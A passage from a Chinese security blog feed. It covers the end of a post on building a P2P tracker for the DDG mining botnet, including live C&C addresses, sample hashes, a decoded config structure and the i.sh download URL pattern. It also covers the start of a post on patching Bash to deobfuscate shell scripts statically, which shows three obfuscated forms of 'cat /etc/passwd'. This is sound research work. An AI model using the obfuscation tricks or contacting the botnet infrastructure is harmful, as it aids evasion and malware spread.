<p>我们要用到日志功能，把全局的日志句柄配置在这里，这样 Memberlist 整个框架的运行日志都会打到我们指定的日志文件中。</p>
<h3 id="3-3-获取并解析最新的-Peers-List"><a href="#3-3-获取并解析最新的-Peers-List" class="headerlink" title="3.3 获取并解析最新的 Peers List"></a>3.3 获取并解析最新的 Peers List</h3><p>前文提到，获取最新的 Peers List，只需在加入 ddg 的 P2P 网络后调用 <code>memberlist.Members()</code> 即可。</p>
<p>其实只说了一半，因为这里还有个偶然发现的小 Trick：这个函数获取到的 Peers List 数量并不大，反倒是从 Memberlist 框架的运行日志中可以抽取更多 Peer 信息。</p>
<p>根据 Memberlist 的框架特性，当前节点加入 P2P 网络之后，会随机与其他 Peers 以 Gossip 的形式通信，这种通信具有节点探测的功能。通信的结果会记录在日志中，尤其是通信失败的日志，记录的比较详细。一条失败的 Gossip 通信日志如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2019/01/23 08:44:53 [ERR] memberlist: Failed to send gossip to 58.144.150.24:7946: write udp 127.0.0.1:7946-&gt;58.144.150.24:7946: sendto: invalid argument</div></pre></td></tr></table></figure>
<p>打出这段日志的代码，在 <a href="https://github.com/hashicorp/memberlist/blob/master/state.go" target="_blank" rel="external">memberlist/stat.go</a> 中实现：</p>
<p><img src="/imgs/gossip_failed_msg.png" alt=""></p>
<p>不过，这段错误信息还不足以提供我们想要的 Peer Info 5 元组。那就动手 Patch 一下这段代码，让它打出我们想要的信息。Patch 后的代码如下：</p>
<p><img src="/imgs/gossip_failed_msg_patched.png" alt=""></p>
<p>然后，打出来的日志内容就会是如下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2019/02/24 18:01:06 [ERR] memberlist: Failed to send gossip to (114.118.18.70:7946:3020:91f7f67194e0d31d9b58d9e6bef4f711)</div></pre></td></tr></table></figure>
<p>这样，既缩减了日志文件的体积，也能精准捕获到我们需要的信息。然后，就可以把 <code>memberlist.Members()</code> 函数获取到的 Peers 信息和日志文件中打出来的 Peers 信息汇总起来，保存到一个变量中，以待后用。</p>
<h3 id="3-4-保存-Peers-信息"><a href="#3-4-保存-Peers-信息" class="headerlink" title="3.4 保存 Peers 信息"></a>3.4 保存 Peers 信息</h3><p>将上述步骤获取到的 Peers 信息保存到数据库中，最新的 20 条 Peers 信息示例如下：</p>
<p><img src="/imgs/latest_20_peers.png" alt=""></p>
<h3 id="3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据"><a href="#3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据" class="headerlink" title="3.5 探测最新活跃的 C&amp;C，拉取最新的配置数据"></a>3.5 探测最新活跃的 C&amp;C，拉取最新的配置数据</h3><p>对上面获取到的 Peers Info 中的每一个 Peer IP，拼接成 URL 串 <code>http://&lt;peer_ip&gt;:8000/slave</code> ，向该 URL 发 Post 请求。能获取符合格式的配置数据的，即为当前存活的 C&amp;C IP。把存活的 C&amp;C Host 信息保存到一个非重复的、并发安全的 List 结构的变量中，最后把这份 C&amp;C Host 列表保存到本地文件中。本地 C&amp;C Host 文件列表部分内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ tail cc_server.list</div><div class="line">20190503060101  132.148.241.138:8000</div><div class="line">20190503060101  109.237.25.145:8000</div><div class="line">20190503060101  104.128.230.16:8000</div><div class="line">20190503060101  117.141.5.87:8000</div><div class="line">20190506060101  132.148.241.138:8000</div><div class="line">20190506060101  104.128.230.16:8000</div><div class="line">20190506060101  117.141.5.87:8000</div><div class="line">20190506120102  104.128.230.16:8000</div><div class="line">20190506120102  132.148.241.138:8000</div><div class="line">20190506120102  117.141.5.87:8000</div></pre></td></tr></table></figure>
<p>前面提到过 ddg 配置数据是经过 msgPack 编码的，前文也列出了解码后的配置数据示例。受限于 Memberlist 的框架实现，我们的追踪程序也只能用 Go 语言来实现。要解码这份配置数据，直接调用 msgPack 的 Go 语言 API 是不够的，还需要逆向分析出配置数据的正确结构，并用 Go 语言的语法来定义这个配置数据的结构。下面是掉了两把头发才逆向出来的配置数据结构，以 Go 语言来定义的结构体：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> msgpack</div><div class="line"><span class="comment">/*</span></div><div class="line">	Salve conf struct</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="keyword">type</span> Conf <span class="keyword">struct</span> &#123;</div><div class="line">	Data      []<span class="keyword">byte</span></div><div class="line">	Signature []<span class="keyword">byte</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ConfData <span class="keyword">struct</span> &#123;</div><div class="line">	CfgVer <span class="keyword">int</span></div><div class="line">	Config MainConf</div><div class="line">	Miner  []MinerConf</div><div class="line">	Cmd    CmdConf</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> MainConf <span class="keyword">struct</span> &#123;</div><div class="line">	Interval <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> MinerConf <span class="keyword">struct</span> &#123;</div><div class="line">	Exe <span class="keyword">string</span></div><div class="line">	Md5 <span class="keyword">string</span></div><div class="line">	Url <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> CmdConf <span class="keyword">struct</span> &#123;</div><div class="line">	AAredis CmdConfDetail</div><div class="line">	AAssh   CmdConfDetail</div><div class="line">	Sh      []ShConf</div><div class="line">	Killer  []ProcConf</div><div class="line">	LKProc  []ProcConf</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> CmdConfDetail <span class="keyword">struct</span> &#123;</div><div class="line">	Id         <span class="keyword">int</span></div><div class="line">	Version    <span class="keyword">int</span></div><div class="line">	ShellUrl   <span class="keyword">string</span></div><div class="line">	Duration   <span class="keyword">string</span></div><div class="line">	NThreads   <span class="keyword">int</span></div><div class="line">	IPDuration <span class="keyword">string</span></div><div class="line">	GenLan     <span class="keyword">bool</span></div><div class="line">	GenAAA     <span class="keyword">bool</span></div><div class="line">	Timeout    <span class="keyword">string</span></div><div class="line">	Ports      []<span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ShConf <span class="keyword">struct</span> &#123;</div><div class="line">	Id      <span class="keyword">int</span></div><div class="line">	Version <span class="keyword">int</span></div><div class="line">	Line    <span class="keyword">string</span></div><div class="line">	Timeout <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ProcConf <span class="keyword">struct</span> &#123;</div><div class="line">	_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:",omitempty"`</span></div><div class="line">	Id       <span class="keyword">int</span></div><div class="line">	Version  <span class="keyword">int</span></div><div class="line">	Expr     <span class="keyword">string</span></div><div class="line">	Timeout  <span class="keyword">string</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将解码成功的配置数据打到日志文件中，只把未解码的 RAW 配置数据保存到本地。最新获取到的配置数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ ll -t slave_conf | head</div><div class="line">total 4.6M</div><div class="line">2.0K May  6 12:34 117_141_5_87__20190506123410.raw    </div><div class="line">2.0K May  6 12:34 132_148_241_138__20190506123410.raw </div><div class="line">2.0K May  6 12:33 104_128_230_16__20190506123309.raw  </div><div class="line">2.0K May  6 06:33 104_128_230_16__20190506063312.raw  </div><div class="line">2.0K May  6 06:31 117_141_5_87__20190506063142.raw    </div><div class="line">2.0K May  6 06:30 132_148_241_138__20190506063042.raw </div><div class="line">2.0K May  6 00:39 104_128_230_16__20190506003932.raw  </div><div class="line">2.0K May  6 00:37 117_141_5_87__20190506003723.raw    </div><div class="line">2.0K May  6 00:34 132_148_241_138__20190506003442.raw</div></pre></td></tr></table></figure>
<h3 id="3-6-下载最新样本"><a href="#3-6-下载最新样本" class="headerlink" title="3.6 下载最新样本"></a>3.6 下载最新样本</h3><p>对于上面步骤中，每一个可以获取合格配置数据的 C&amp;C IP，拼接 URL 串 <code>http://&lt;cc_ip&gt;:8000/i.sh</code> ，这是 ddg 目前用到的最新恶意 Shell 脚本的下载链接。通过 HTTP GET 请求下载这个 i.sh 文件，跟本地已有的、相同 URL 下载到的 i.sh 文件对比 MD5 值，如果 MD5 跟旧的 i.sh 相同，则丢弃刚下载 i.sh 文件。</p>
<p>如果最新的 i.sh 文件跟旧 i.sh 文件 MD5 不同，则进行以下两步操作：</p>
<ol>
<li><p>对比上述 i.sh 下载链接与刚获取到的最新配置数据中执行的 i.sh 下载链接是否相同，不同则对最新配置数据中指定的 i.sh 脚本也做下载&amp;解析操作；</p>
</li>
<li><p>成功获取到 i.sh 脚本，则解析其中的样本 Download URL，下载样本，同本地相同 URL 下载到的样本对比 MD5 和 FileName(其实是 Download URL)，如果 MD5 或者 FileName 不同，则保留样本，否则删除刚下载到的样本。</p>
<p>样本 MD5 和 FileName 的对比结果，有三种情况：</p>
<ul>
<li><p>仅仅 MD5 不同而 FileName 相同，说明同一个 URL 中下到了不同 MD5 的样本，即样本有更新；</p>
</li>
<li><p>仅仅 FileName 不同而 MD5 相同，则不同的 URL 想到了相同 MD5 的样本，通常意味着 C&amp;C 有变动；</p>
</li>
<li><p>两者都不同则说明 C&amp;C 有变动并且样本有更新。</p>
</li>
</ul>
</li>
</ol>
<p>截至目前，我通过 ddg 追踪程序监控到的部分 ddg 样本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">➜ ll sample</div><div class="line">total 115M</div><div class="line">1.7K 104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">8.8M 104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">1.8K 104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">3.6M 104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.9K 104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">3.6M 104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.1K 117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">1.7K 117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">8.8M 117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 117_141_5_87__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3.6M 117_141_5_87__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 117_141_5_87__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.3K 119_9_106_27__8000__i_sh+09a3a0f662738279e344b2a38dc93ecb</div><div class="line">1.2K 119_9_106_27__8000__i_sh+9dc32a4a87d2b579d03b6adb27e3f604</div><div class="line">1.6K 119_9_106_27__8000__i_sh+b8a64e8bfe4a69c36760505cc757c38d</div><div class="line">3.6M 119_9_106_27__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 119_9_106_27__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">9.4M 119_9_106_27__8000__static__3022__ddgs_i686+c32bd921a71d82696517c22021173480</div><div class="line"> 11M 119_9_106_27__8000__static__3022__ddgs_x86_64+79d762d1ff16142ea3bdae560558e718</div><div class="line">1.7K 132_148_241_138__8000__i_sh+44feb3cd31b957e24b18f97c46b57431</div><div class="line">1.1K 132_148_241_138__8000__i_sh+fcc003280d8e9060e00fb7273d8edee7</div><div class="line">8.8M 132_148_241_138__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 132_148_241_138__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3.6M 132_148_241_138__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 132_148_241_138__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">➜</div><div class="line">➜ md5sum sample/*</div><div class="line">8801aff2ec7c44bed9750f0659e4c533  104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">8c2e1719192caa4025ed978b132988d6  104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">dc477d4810a8d3620d42a6c9f2e40b40  104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">55ea97d94c6d74ceefea2ab9e1de4d9f  104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">100d1048ee202ff6d5f3300e3e3c77cc  117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">5760d5571fb745e7d9361870bc44f7a3  117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">8c2e1719192caa4025ed978b132988d6  117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  117_141_5_87__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  117_141_5_87__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  117_141_5_87__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">09a3a0f662738279e344b2a38dc93ecb  119_9_106_27__8000__i_sh+09a3a0f662738279e344b2a38dc93ecb</div><div class="line">9dc32a4a87d2b579d03b6adb27e3f604  119_9_106_27__8000__i_sh+9dc32a4a87d2b579d03b6adb27e3f604</div><div class="line">b8a64e8bfe4a69c36760505cc757c38d  119_9_106_27__8000__i_sh+b8a64e8bfe4a69c36760505cc757c38d</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  119_9_106_27__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  119_9_106_27__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">c32bd921a71d82696517c22021173480  119_9_106_27__8000__static__3022__ddgs_i686+c32bd921a71d82696517c22021173480</div><div class="line">79d762d1ff16142ea3bdae560558e718  119_9_106_27__8000__static__3022__ddgs_x86_64+79d762d1ff16142ea3bdae560558e718</div><div class="line">44feb3cd31b957e24b18f97c46b57431  132_148_241_138__8000__i_sh+44feb3cd31b957e24b18f97c46b57431</div><div class="line">fcc003280d8e9060e00fb7273d8edee7  132_148_241_138__8000__i_sh+fcc003280d8e9060e00fb7273d8edee7</div><div class="line">8c2e1719192caa4025ed978b132988d6  132_148_241_138__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  132_148_241_138__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  132_148_241_138__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  132_148_241_138__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div></pre></td></tr></table></figure>
<p>综合以上描述，本地文件目录及文件示例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">- ddg_tracker/</div><div class="line">|-- cc_server.list</div><div class="line">|-- log/</div><div class="line">|   |-- 20190123164450.log</div><div class="line">|   |-- 20190123180232.log</div><div class="line">|   |-- 20190123211837.log</div><div class="line">|   |-- 20190124000101.log</div><div class="line">|   |-- 20190124060101.log</div><div class="line">|   `-- ......</div><div class="line">|-- sample/</div><div class="line">|   |-- 104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">|   |-- 104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">|   |-- 104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">|   |-- 104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">|   |-- 104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">|   |-- 104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">|   |-- 104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">|   |-- 104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">|   |-- 104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">|   |-- 117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">|   |-- 117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">|   |-- 117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">|   `-- ......</div><div class="line">`-- slave_conf/</div><div class="line">    |-- 104_236_156_211__20190123165004.raw</div><div class="line">    |-- 104_236_156_211__20190123185208.raw</div><div class="line">    |-- 104_236_156_211__20190123223044.raw</div><div class="line">    |-- 104_236_156_211__20190124012600.raw</div><div class="line">    |-- 132_148_241_138__20190224191449.raw</div><div class="line">    `-- ......</div></pre></td></tr></table></figure>
<p>至此，我们就完成了 ddg 追踪程序的设计，为这个程序设置一个计划任务，定时运行一次即可。我个人的源码暂时不会放出来，有兴趣的朋友可以自己动手实现一下。目前的追踪成果(uniq peer ip):</p>
<p><img src="/imgs/count_distinct_ip.png" style="zoom:50%"></p>
<p>一次探测到的活跃节点数：</p>
<p><img src="/imgs/latest_alive_bots.png" alt=""></p>
<p>部分 DDG 更新的 Slack 消息推送：</p>
<p><img src="/imgs/botnet_tracker_slack_msg.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序&lt;br&gt; &lt;strong&gt;文章分为三部分&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Botnet 简介&lt;/li&gt;
&lt;li&gt;DDG.Mining.Botnet 介绍，着重介绍其涉及的 P2P 特性；&lt;/li&gt;
&lt;li&gt;根据 DDG.Mining.Botnet 的 P2P 特性，设计一个僵尸网络跟踪程序 DDG.P2P.Tracker，来遍历 Botnet 中的节点、及时获取最新的云端配置文件、及时获知 Botnet 中最新启用的 C&amp;amp;C 服务器。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;文章首发于安全客，原文链接：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177665&quot;&gt;以P2P的方式追踪 DDG 僵尸网络（上）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177742&quot;&gt;以P2P的方式追踪 DDG 僵尸网络（下）&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="ddg" scheme="http://jiayu0x.com/tags/ddg/"/>
    
      <category term="p2p" scheme="http://jiayu0x.com/tags/p2p/"/>
    
      <category term="botnet" scheme="http://jiayu0x.com/tags/botnet/"/>
    
  </entry>
  
  <entry>
    <title>Patch Bash5.0，让 -x 只打印而不执行，静态解混淆 Shell 脚本</title>
    <link href="http://jiayu0x.com/2019/03/27/patch-bash5.0-for-deobfuscation/"/>
    <id>http://jiayu0x.com/2019/03/27/patch-bash5.0-for-deobfuscation/</id>
    <published>2019-03-26T16:00:00.000Z</published>
    <updated>2019-05-11T05:09:21.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>攻防对抗中，JavaScript 和 Powershell 脚本的混淆见得很多，但经过混淆的 Shell 脚本见得相对少一些。其实，Shell 作为一种简易而灵活的编程语言，其脚本也完全可以做到像 JS/Powershell 那样的混淆。混淆一般是为了逃过自动化检测，也可以给人工分析增加难度。比如，针对 <code>cat /etc/passwd</code> 这一条命令就可以用下面 3 种轻度混淆的方式来编写：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cat /et$<span class="string">'c/pa\u0000/notexist/path'</span>sswd</div><div class="line"></div><div class="line"><span class="built_in">test</span>=/ehhh/hmtc/pahhh/hmsswd</div><div class="line">cat <span class="variable">$&#123;test//hh??hm/&#125;</span></div><div class="line"></div><div class="line">tmp_str=saudoihfnssoirtgn</div><div class="line">cat $(<span class="built_in">echo</span> /e)tc$(<span class="built_in">echo</span> /pa)<span class="variable">$&#123;tmp_str:9:2&#125;</span>wd</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>更复杂的 Shell 脚本混淆在真实攻击中也时有发生，比如 <a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="external">systemdMiner 借鸡下蛋，通过 DDG 传播自身</a> 这个案例里的 cron.sh，就经过了高度混淆，混淆到了肉眼几乎什么也看不出来的地步。</p>
<p>对于这些混淆过的 Shell 脚本，最便捷的方式莫过于用 Bash 的 <strong><code>-x</code></strong> 选项，可以对混淆过的脚本逐层解混淆，直到最终还原，以下是上面的 cron.sh 解混淆过程最后部分的截图:</p>
<p><img src="/imgs/mybash_deob_cron_sh.png" alt=""></p>
<p>但是，这个做法有个问题：<code>bash -x &lt;SH_SCRIPT_FILE&gt;</code> <strong>最终会真的执行</strong> Shell 脚本。</p>
<p>如此一来，针对恶意的、混淆过的 Shell 脚本，用这种方法解混淆，就只能扔到 Linux 虚拟机中去执行了。只想看它的动态行为，这样没问题；如果只想对恶意 Shell 脚本进行静态分析，并不想真正执行它，更懒得单独开一个虚拟机去还原它……怎么办？就不能直接通过一个什么工具还原它嘛？或者根据简单的混淆规则、自己写一个小工具对 Shell 脚本自动化解混淆？</p>
<p>我没找到这种工具，研究了一下，Shell 代码混淆的姿势还是有点繁杂的。想自己写一个工具，走语法解析并还原最终代码的路子，会比较艰难。</p>
<p>于是就想，Bash 是自由软件，网上可以直接下载到源码，那能不能试试给 Bash 的源码打个 Patch，让 <strong>-x</strong> 选项仅仅打印解混淆后的 Shell 代码，而不执行最终的 Shell 代码，达到静态解混淆的目的？网上搜 <strong>Shell 反混淆</strong> 相关的资料，搜到这么一篇文章： <a href="https://cloud.tencent.com/developer/article/1369290" target="_blank" rel="external">linux命令反混淆-忙里偷闲</a> ，里面也用到了这个思路，但没有把 Patch Bash 源码的技术细节公开。</p>
<p>只好自动动手试一下，最终给 Bash 5.0 的源码打了一个不完美的 Patch，但基本满足静态解混淆的需求。本文记录给 Bash 源码打 Patch 的思路。</p>
<blockquote>
<p>Bash5.0 源码下载： <a href="https://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz" target="_blank" rel="external">https://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz</a></p>
</blockquote>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>比较直接的思路，就是找到 Bash 源码中最终执行 Shell 代码的位置，根据 <strong>-x</strong> 选项给它 Patch 掉，不让它执行 Shell 代码。这样大概需要做以下 3 件事：</p>
<ol>
<li>确认 <strong>-x</strong> 在代码中的标识。Bash 启动的时候，肯定解析参数，对于 <strong>-x</strong> 选项，肯定要在代码中做一下标记，以便在后续的执行过程中，对于特定的代码要打印出来；</li>
<li>厘清 Bash 从启动到解析 Shell 脚本、解混淆脚本中混淆过的代码到最终执行的大概流程，尤其要梳理清楚这个过程中的关键函数调用路径；</li>
<li>找到最后执行解混淆后 Shell 代码的位置，用 <strong>-x</strong> 选项的标记给它 Patch 一下：如果启用了 <strong>-x</strong> 选项，就不执行代码，否则就执行最终的 Shell 代码。</li>
</ol>
<p>这种工作，注定是“头重脚轻”的工作：开头要做大量的工作，反复研究、设计、校对方案，最后只不过需要在关键位置做几个改动……类似于修一架构造庞杂的机器，事先要做大量的检测工作，最后只需要拧两颗螺丝就搞定。</p>
<p>而 Bash 5.0 有近 20W 行代码，不算很小的项目。好在做这件事并不需要读懂所有代码。</p>
